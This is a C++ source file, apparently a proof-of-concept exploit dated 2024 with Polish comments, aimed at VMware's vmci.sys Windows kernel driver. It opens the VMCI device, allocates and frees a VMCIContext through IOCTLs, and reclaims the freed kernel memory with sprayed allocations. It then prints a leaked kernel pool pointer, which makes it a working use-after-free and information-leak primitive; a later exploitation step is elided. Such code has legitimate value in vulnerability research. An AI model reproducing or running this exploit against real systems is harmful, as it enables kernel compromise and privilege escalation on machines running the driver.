// VMW.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
// -----------------
// POC (vmci.sys fv-9.8.16.0 vp-9.8.16.0 build-14168184) 
// -----------------
// @echo
// 10/03/2024 
//////////////////////

#include <iostream>
#include <deque>
#include <Windows.h>
#include <tchar.h>

constexpr int MAGIX_ID = 663133766;

class VMCI_interface {

    HANDLE dev_;

    VMCI_interface(const VMCI_interface&) = delete;
    VMCI_interface& operator=(VMCI_interface&) = delete;
    VMCI_interface(const VMCI_interface&&) = delete;
    VMCI_interface& operator=(VMCI_interface&&) = delete;

public:

    explicit VMCI_interface(const TCHAR* dev_path) noexcept(true);

    explicit VMCI_interface() noexcept(true);

    ~VMCI_interface() noexcept(true);

    inline bool is_open()  noexcept(true) {
        return (dev_ != NULL && dev_ != INVALID_HANDLE_VALUE) ? true : false;
    }

    inline HANDLE handler() noexcept(true) {
        return dev_;
    }

    DWORD ioctl_0x8103204C(void* user_addr, DWORD op_code, DWORD alloc_size) noexcept(true);

    bool ioctl_0x81032008(DWORD ctx_id, DWORD arg2, DWORD arg3) noexcept(true);

    DWORD ioctl_0x81032024(DWORD value) noexcept(true);

    void close() noexcept(true) {
        if (dev_ != INVALID_HANDLE_VALUE) {
            CloseHandle(dev_);
            dev_ = INVALID_HANDLE_VALUE;
        }
    }

};

DWORD VMCI_interface::ioctl_0x81032024(DWORD value) noexcept(true) {

    DWORD IN_buff[2];
    DWORD OUT_buff[2];

    IN_buff[0] = value;
    IN_buff[1] = 0;

    OUT_buff[0] = value;
    OUT_buff[1] = 0;

    DWORD dw_ret = 0;
    DeviceIoControl(handler(), 0x81032024, &IN_buff, sizeof(IN_buff), OUT_buff, 4, &dw_ret, NULL);
       
    return OUT_buff[0];

}

bool VMCI_interface::ioctl_0x81032008(DWORD ctx_id, DWORD arg2, DWORD arg3) noexcept(true) {

    INT32 IN_buff[0x10] = { 0 };  
    IN_buff[0] = ctx_id;
    IN_buff[1] = arg2;
    IN_buff[2] = arg3;

    char OUT_SystemBuff[4] = { 0 };

    DWORD dw_ret = 0;
    if (DeviceIoControl(handler(), 0x81032008, &IN_buff, sizeof(IN_buff), OUT_SystemBuff, 4, &dw_ret, NULL) != TRUE) {
        return false;
    }

    return true;

}

DWORD VMCI_interface::ioctl_0x8103204C(void* user_addr, DWORD op_code, DWORD alloc_size) noexcept(true) {
     
    struct IN_SystemBuffer {
        void* r3_addr;
        DWORD op_code;
        DWORD alloc_size;
        void* padding;
    } IN_buff;

    IN_buff.r3_addr    = user_addr;
    IN_buff.op_code    = op_code;
    IN_buff.alloc_size = alloc_size;

    DWORD dw_ret = 0;
    char OUT_SystemBuff[24] = { 0 };

    DeviceIoControl(handler(), 0x8103204C, &IN_buff, sizeof(IN_buff), OUT_SystemBuff, 24, &dw_ret, NULL);

    return dw_ret;

}

VMCI_interface::VMCI_interface(const TCHAR* dev_path) noexcept(true) {
    dev_ = CreateFile(dev_path, GENERIC_WRITE | GENERIC_READ  , FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
}

VMCI_interface::VMCI_interface() noexcept(true) {  //heh 
    dev_ = CreateFile(_T("\\\\.\\VMCIDev\\VMX"), STANDARD_RIGHTS_ALL , FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
}

VMCI_interface::~VMCI_interface() noexcept(true) {
    close();
}

int main()
{
    int main_ret = -1;

    VMCI_interface vmci1(_T("\\\\.\\VMCIDev"));
    if (!vmci1.is_open()) {
        std::cout << "Opening \\\\.\\VMCIDev (1) fail\r\n";
        return -1;
    }

    VMCI_interface vmci2(_T("\\\\.\\VMCIDev"));
    if (!vmci2.is_open()) {
        std::cout << "Opening \\\\.\\VMCIDev (2) fail\r\n";
        return -1;
    }

    std::cout << "Opening \\\\.\\VMCIDev success\r\n";

    /*
    set _Irp->CurrentStackLocation->FileObject->FsContext->off_0x14 != 0
    */
    DWORD ret = vmci1.ioctl_0x81032024(0x8FFFE - 2);
    if (ret == 0x0B0000) {
        std::cout << "ioctl 0x81032024 (vmci1) return: " << std::hex << "0x" << ret << " (invalid value)" << std::dec << std::endl;
        return -1;
    }

    ret = vmci2.ioctl_0x81032024(0x8FFFE - 2);
    if (ret == 0x0B0000) {
        std::cout << "ioctl 0x81032024 (vmci2) return: " << std::hex << "0x" << ret << " (invalid value)" << std::dec << std::endl;
        return -1;
    }

    std::cout << "ioctl 0x81032024 success on vmci1 & vmci2\r\n";

    /*allocating VMCIContext on vmci1 */
    if (!vmci1.ioctl_0x81032008(MAGIX_ID, 1, 3)) {
        std::cout << "ioctl 0x81032008 (vmci1) fail! GetLastError() = 0x" << std::hex << GetLastError() << std::dec << std::endl;
        return -1;
    }

    std::cout << "ioctl 0x81032008 allocate VMCIContext with id: " << MAGIX_ID << " succcess" << std::endl;

    /*allocating VMCIContext on vmci2 */
    if (!vmci2.ioctl_0x81032008(99999, 1, 3)) {
        std::cout << "ioctl 0x81032008 (vmci2) fail! GetLastError() = 0x" << std::hex << GetLastError() << std::dec << std::endl;
        return -1;
    }

    std::cout << "ioctl 0x81032008 allocate VMCIContext with id: 99999 succcess" << std::endl;

    /*free VMCIContext (vmci1)*/
    std::cout << "freeing VMCIContext with id: "<< MAGIX_ID << " (vmci1)" << std::endl;
    vmci1.close(); 

    /*number of allocations*/
    constexpr int blocks = 13;
    /*VMCIContext size*/
    constexpr SIZE_T mem_size = 0x90; 

    bool  found = false;
    char* uas[blocks] = { nullptr };

    /*trying rellocate freed VMCIContext (vmci1)*/
    for (int i = 0; i < blocks; i++) {

        uas[i] =  reinterpret_cast<char*>(VirtualAllocEx(GetCurrentProcess(), NULL, mem_size, MEM_COMMIT, PAGE_READWRITE));
        if (uas[i] == NULL) {
            std::cout << "VirtualAllocEx fail!" << std::endl;
            goto __free;
        }

        ZeroMemory(uas[i], mem_size);
       
        if ((ret = vmci2.ioctl_0x8103204C(uas[i], 8, mem_size)) == 0) {
            std::cout << "ioctl 0x8103204C [opcode:8/rellocate] (vmci2) fail! GetLastError() = 0x" << std::hex << GetLastError() << std::dec << std::endl;
            goto __free;
        }

        struct dump_data {
            void* a;           //0x0
            void* b;           //0x8
            DWORD vmci_ctx;    //0x10
            DWORD c;           //0x14
            char  padding[0x60];      //0x18
            void* global_ptr;
        };

        dump_data* dump = reinterpret_cast<dump_data*>(uas[i]);
        if (dump->vmci_ctx == MAGIX_ID && !found)  { 

            found = true;

            /*
             VMCIContext->off_0x88 to wskaźnik do funkcji, niestety niepamiętam gdzie on był inicjalizowany i nie chce mi się szukać, a bez inicjalizacji to oczyiwiście nullptr
             poza tym w VMCIContext są właściwie same wskaźniki do pamięci dynamicznej jądra, ale VMCIContext ma jeszcze tą zaletę że łatwo 
             go zidentyfikować w pamięci szukająć MAGIX_ID, no i oczywiście kontrolujemy alokacje i zwalnianie. 
            */

            std::cout << "vmci.sys freed VMCIContext found!" << std::endl;
            std::cout << "vmci.sys kernel pool pointer address is : 0x" << std::hex <<dump->global_ptr<< std::endl;
            //...
            main_ret = 0;

        }

    }

    __free: 
    for (int i = 0; i < blocks; i++) {
        if (uas[i] != NULL) {
            VirtualFreeEx(GetCurrentProcess(), uas[i], 0, MEM_RELEASE);
        }
    }

    return main_ret;

}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
